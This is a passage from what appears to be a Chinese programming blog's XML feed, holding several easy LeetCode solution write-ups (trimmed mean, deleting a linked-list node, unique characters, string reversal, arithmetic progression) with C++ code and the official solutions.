<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [9,7,8,7,7,8,4,4,6,8,8,7,6,8,8,9,2,6,0,0,1,10,8,6,3,3,5,1,10,9,0,7,10,0,10,4,1,10,6,9,3,6,0,0,2,7,0,6,7,2,9,7,7,3,0,1,6,1,10,3]</span><br><span class="line">输出：5.27778</span><br></pre></td></tr></table></figure>
<p><strong>示例5：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [4,8,4,10,0,7,1,3,7,8,8,3,4,1,6,2,1,1,8,0,9,8,0,3,9,10,3,10,1,10,7,3,2,1,4,9,10,7,6,4,0,8,5,1,2,1,6,2,5,0,7,10,9,10,3,7,10,5,8,5,7,6,7,6,10,9,5,10,5,5,7,2,10,7,7,8,2,0,1,1]</span><br><span class="line">输出：5.29167</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>20 &lt;= arr.length &lt;= 1000</code></li>
<li><code>arr.length</code> 是 <code>20</code> 的 <strong>倍数</strong> </li>
<li><code>0 &lt;= arr[i] &lt;= 105</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>刚开始看题目没看懂，以为是只删除一个最大值和一个最小值，看了一眼题解才知道要删除数组总个数%5的最小值和%5的最大值，提示里也说了arr.length是20的倍数保证要删除的个数是个整数。那就很好做了。</p>
<p>对数组arr非递减排序，然后遍历arr数组%5-95%这一部分中间的元素累加求和，最后返回平均值。</p>
<p><strong>c++代码：</strong>(执行用时20ms，击败62.70%，内存消耗9.6M，击败39.18%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">trimMean</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line">        sort(arr.begin(),arr.end());</span><br><span class="line">        <span class="keyword">int</span> n=<span class="keyword">int</span>(arr.size()*<span class="number">0.05</span>);</span><br><span class="line">        <span class="keyword">double</span> result;</span><br><span class="line">        <span class="keyword">double</span> tmp=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">auto</span> it=arr.begin()+n;</span><br><span class="line">        <span class="keyword">while</span>(it&lt;arr.end()-n)&#123;</span><br><span class="line">            tmp+=*it;</span><br><span class="line">            ++it;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> tmp*<span class="number">1.0</span>/(arr.size()<span class="number">-2</span>*n);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，读懂了题目之后就比较简单了。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>删除链表中的节点</title>
    <url>/2020/11/09/%E5%88%A0%E9%99%A4%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E8%8A%82%E7%82%B9/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://leetcode-cn.com/problems/delete-node-in-a-linked-list/"><strong>题目地址</strong></a></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>请编写一个函数，使其可以删除某个链表中给定的（非末尾）节点。传入函数的唯一参数为 <strong>要被删除的节点</strong> 。</p>
<p>现有一个链表 — head = [4,5,1,9]，它可以表示为:</p>
<p><img src="/2020/11/09/%E5%88%A0%E9%99%A4%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E8%8A%82%E7%82%B9/237_example.png" alt="img"></p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：head &#x3D; [4,5,1,9], node &#x3D; 5</span><br><span class="line">输出：[4,1,9]</span><br><span class="line">解释：给定你链表中值为 5 的第二个节点，那么在调用了你的函数之后，该链表应变为 4 -&gt; 1 -&gt; 9.</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：head &#x3D; [4,5,1,9], node &#x3D; 1</span><br><span class="line">输出：[4,5,9]</span><br><span class="line">解释：给定你链表中值为 1 的第三个节点，那么在调用了你的函数之后，该链表应变为 4 -&gt; 5 -&gt; 9.</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li>链表至少包含两个节点。</li>
<li>链表中所有节点的值都是唯一的。</li>
<li>给定的节点为非末尾节点并且一定是链表中的一个有效节点。</li>
<li>不要从你的函数中返回任何结果。</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>题目和之前的一道题几乎一样，<a href="https://z2bns.github.io/2020/11/07/%E5%88%A0%E9%99%A4%E4%B8%AD%E9%97%B4%E8%8A%82%E7%82%B9/">参考题目</a>。</p>
<p>依次把删除节点下一个节点的值赋值给当前节点，也就是说把要删除的节点当做下一个节点，这样把要删除节点后面的链元素依次前移。处理特殊情况：删除的是倒数第二个节点因为它下一个节点是最后一个节点，依次调用deleteNode函数，若删除节点是倒数第二个，则直接next指针为NULL，否则递归调用deleteNode函数。</p>
<p><strong>c++代码：</strong>(执行用时20ms，击败36.18%，内存消耗8.1M，击败5.22%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">deleteNode</span><span class="params">(ListNode* node)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//把要删除的节点变成下一个节点</span></span><br><span class="line">        node-&gt;val=node-&gt;next-&gt;val;</span><br><span class="line">        <span class="comment">//如果是不是倒数第二个节点，递归删除下一个节点</span></span><br><span class="line">        <span class="keyword">if</span>(node-&gt;next-&gt;next)&#123;</span><br><span class="line">            deleteNode(node-&gt;next);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//是倒数第二个节点，直接删除下一个节点</span></span><br><span class="line">            node-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/delete-node-in-a-linked-list/solution/shan-chu-lian-biao-zhong-de-jie-dian-by-leetcode/">官方题解</a>:</h6><p><strong>方法：与下一个节点交换</strong><br>从链表里删除一个节点 <code>node</code> 的最常见方法是修改之前节点的 <code>next</code> 指针，使其指向之后的节点。</p>
<p><img src="/2020/11/09/%E5%88%A0%E9%99%A4%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E8%8A%82%E7%82%B9/3579a496897df5321c110bf1301872b6e10c342f5e400ce45d2db0348d00d715-file_1555866623326" alt="img"></p>
<p>因为，我们无法访问我们想要删除的节点 之前 的节点，我们始终不能修改该节点的 <code>next</code> 指针。相反，我们必须将想要删除的节点的值替换为它后面节点中的值，然后删除它之后的节点。</p>
<p><img src="/2020/11/09/%E5%88%A0%E9%99%A4%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E8%8A%82%E7%82%B9/902dc5d3f8c44d3cbc0b6e837711cad2eefc021fd2b9de8dfabc6d478bc779b1-file_1555866680932" alt="img"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteNode</span><span class="params">(ListNode node)</span> </span>&#123;</span><br><span class="line">    node.val = node.next.val;</span><br><span class="line">    node.next = node.next.next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>官方题解给出了java代码，我根据思路改成了c++代码如下：</p>
<p>c++代码：（执行12ms，击败97.32%，内存8.1M，击败5.22%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">deleteNode</span><span class="params">(ListNode* node)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//把要删除的节点的val和next变成下一个节点的值</span></span><br><span class="line">        node-&gt;val=node-&gt;next-&gt;val;</span><br><span class="line">        node-&gt;next=node-&gt;next-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<p>时间和空间复杂度都是：$O(1)$。</p>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解这个思路很好，我是想到用把删除节点及以后节点的val值变成下一个节点的值，把最后倒数第二个节点的next指针置为空，想复杂了，直接把删除节点的next值也换成下一个节点的值就ok了，实际上删除的是要删除节点的下一节点，妙啊。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>判定字符是否唯一</title>
    <url>/2020/11/20/%E5%88%A4%E5%AE%9A%E5%AD%97%E7%AC%A6%E6%98%AF%E5%90%A6%E5%94%AF%E4%B8%80/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/flipping-an-image/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>实现一个算法，确定一个字符串 <code>s</code> 的所有字符是否全都不同。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: s &#x3D; &quot;leetcode&quot;</span><br><span class="line">输出: false </span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: s &#x3D; &quot;abc&quot;</span><br><span class="line">输出: true</span><br></pre></td></tr></table></figure>
<p><strong>限制：</strong></p>
<ul>
<li><code>0 &lt;= len(s) &lt;= 100</code></li>
<li>如果你不使用额外的数据结构，会很加分。</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>对字符串字符进行升序排序，判断每个字符是否和下一个字符是否相同，如果相同返回false。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.2M，击败24.64%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isUnique</span><span class="params">(<span class="built_in">string</span> astr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=astr.length();</span><br><span class="line">        <span class="comment">//对字符串字符升序排序</span></span><br><span class="line">        sort(astr.begin(),astr.end());</span><br><span class="line">        <span class="comment">//比较每个字符和下个字符是否相同</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(astr[i]==astr[i+<span class="number">1</span>])&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，比较简单🧑。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>反转字符串</title>
    <url>/2020/11/17/%E5%8F%8D%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/height-checker/submissions/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>编写一个函数，其作用是将输入的字符串反转过来。输入字符串以字符数组 <code>char[]</code> 的形式给出。</p>
<p>不要给另外的数组分配额外的空间，你必须原地<strong>修改输入数组</strong>、使用 O(1) 的额外空间解决这一问题。</p>
<p>你可以假设数组中的所有字符都是 ASCII 码表中的可打印字符。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[&quot;h&quot;,&quot;e&quot;,&quot;l&quot;,&quot;l&quot;,&quot;o&quot;]</span><br><span class="line">输出：[&quot;o&quot;,&quot;l&quot;,&quot;l&quot;,&quot;e&quot;,&quot;h&quot;]</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[&quot;H&quot;,&quot;a&quot;,&quot;n&quot;,&quot;n&quot;,&quot;a&quot;,&quot;h&quot;]</span><br><span class="line">输出：[&quot;h&quot;,&quot;a&quot;,&quot;n&quot;,&quot;n&quot;,&quot;a&quot;,&quot;H&quot;]</span><br></pre></td></tr></table></figure>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历字符串（只需遍历前一半），使用swap函数交换前后两个字符。</p>
<p><strong>c++代码：</strong>(执行用时32ms，击败99.67%，内存消耗23.2M，击败5.18%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">reverseString</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt;&amp; s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=s.size();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n/<span class="number">2</span>;++i)&#123;</span><br><span class="line">            swap(s[i],s[n-i<span class="number">-1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/reverse-string/solution/fan-zhuan-zi-fu-chuan-by-leetcode-solution/">官方题解</a>:</h6><p><strong>方法一：双指针</strong></p>
<p><strong>思路与算法</strong></p>
<p>对于长度为 <code>N</code> 的待被反转的字符数组，我们可以观察反转前后下标的变化，假设反转前字符数组为 <code>s[0] s[1] s[2] ... s[N - 1]</code>，那么反转后字符数组为 <code>s[N - 1] s[N - 2] ... s[0]</code>。比较反转前后下标变化很容易得出 <code>s[i]</code> 的字符与 <code>s[N - 1 - i]</code> 的字符发生了交换的规律，因此我们可以得出如下双指针的解法：</p>
<ul>
<li><p>将 <code>left</code> 指向字符数组首元素，<code>right</code> 指向字符数组尾元素。</p>
</li>
<li><p>当 <code>left &lt; right</code>：</p>
<ul>
<li><p>交换 <code>s[left]</code> 和 <code>s[right]</code>；</p>
</li>
<li><p><code>left</code> 指针右移一位，即 <code>left = left + 1</code>；</p>
</li>
<li><code>right</code> 指针左移一位，即 <code>right = right - 1</code>。</li>
</ul>
</li>
<li><p>当 <code>left &gt;= right</code>，反转结束，返回字符数组即可。</p>
</li>
</ul>
<p><img src="/2020/11/17/%E5%8F%8D%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2/344_fig1.png" alt="fig1"></p>
<p><strong>c++代码：</strong>(执行用时40ms，击败96.82%，内存消耗23M，击败17.48%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">reverseString</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt;&amp; s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.size();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> left = <span class="number">0</span>, right = n - <span class="number">1</span>; left &lt; right; ++left, --right) &#123;</span><br><span class="line">            swap(s[left], s[right]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(N)$，其中 $N$ 为字符数组的长度。一共执行了 $N/2$ 次的交换。</li>
<li>空间复杂度：$O(1)$。只使用了常数空间来存放若干变量。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>和官方题解思路一样，代码也是一致的思路，有些许差别。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>判断能否形成等差数列</title>
    <url>/2020/11/23/%E5%88%A4%E6%96%AD%E8%83%BD%E5%90%A6%E5%BD%A2%E6%88%90%E7%AD%89%E5%B7%AE%E6%95%B0%E5%88%97/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/can-make-arithmetic-progression-from-sequence/submissions/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个数字数组 <code>arr</code> 。</p>
<p>如果一个数列中，任意相邻两项的差总等于同一个常数，那么这个数列就称为 等差数列 。</p>
<p>如果可以重新排列数组形成等差数列，请返回 <code>true</code> ；否则，返回 <code>false</code> 。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [3,5,1]</span><br><span class="line">输出：true</span><br><span class="line">解释：对数组重新排序得到 [1,3,5] 或者 [5,3,1] ，任意相邻两项的差分别为 2 或 -2 ，可以形成等差数列。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [1,2,4]</span><br><span class="line">输出：false</span><br><span class="line">解释：无法通过重新排序得到等差数列。</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>2 &lt;= arr.length &lt;= 1000</code></li>
<li><code>-10^6 &lt;= arr[i] &lt;= 10^6</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>很简单，对数组升序排序，计算前两项的差d，然后从第3个元素遍历数组判断每一个元素与前一个元素之差是否等于d，如果不等于就不是等差数列返回false，循环结束证明是等差数列返回true。</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败98.95%，内存消耗9.1M，击败29.94%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">canMakeArithmeticProgression</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        sort(arr.begin(),arr.end());</span><br><span class="line">        <span class="comment">//前两项的差</span></span><br><span class="line">        <span class="keyword">int</span> d=arr[<span class="number">1</span>]-arr[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> n=arr.size();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;n;++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(arr[i]-arr[i<span class="number">-1</span>]!=d)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/can-make-arithmetic-progression-from-sequence/solution/pan-duan-neng-fou-xing-cheng-deng-chai-shu-lie-by-/">官方题解</a>:</h6><p><strong>方法一： 模拟</strong></p>
<p><strong>思路与算法</strong></p>
<p>首先我们对原序列排序，假设排序之后序列为 $\{ a_0, a_1, \cdots a_n \}$，如果对 $i \in [1, n - 1]$ 中的每个数都有 $a_i \times 2 = a_{i - 1} + a_{i + 1}$ 成立，那么这个数列就是等差数列。</p>
<p><strong>c++代码：</strong>(执行用时8ms，击败86.14%，内存消耗9.2M，击败10.75%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">canMakeArithmeticProgression</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line">        sort(arr.begin(), arr.end());</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; arr.size() - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[i] * <span class="number">2</span> != arr[i - <span class="number">1</span>] + arr[i + <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(n \log n)$。排序的时间代价为 $O(n \log n)$，遍历序列的时间代价是 $O(n)$，故渐进时间复杂度为 $O(n \log n + n) = O(n \log n)$。</li>
<li>空间复杂度：$O(\log n)$。快速排序中使用的栈空间期望是 $O(\log n)$。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解使用了等差数列的性质进行的判断，我是基于等差数列的性质判断的，都差不多，也比较简单。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>反转字符串中的单词III</title>
    <url>/2020/11/18/%E5%8F%8D%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E7%9A%84%E5%8D%95%E8%AF%8DIII/</url>
